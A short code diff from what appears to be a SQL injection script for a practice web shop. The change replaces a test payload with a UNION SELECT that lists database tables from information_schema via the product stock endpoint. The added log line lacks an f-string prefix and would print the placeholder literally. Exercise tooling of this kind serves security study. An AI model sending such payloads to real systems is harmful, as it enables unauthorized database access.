@@ -55,7 +55,8 @@ def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
     url = shop.base_url + "product/stock"
-    payload = format_payload("UNION SELECT 'abcd'")
+    payload = format_payload("UNION SELECT table_name from information_schema.tables")
+    log.info("Sending SQLi Payload: {payload}")
     if shop.no_proxy:
         resp = requests.post(url, data=payload)
     else:
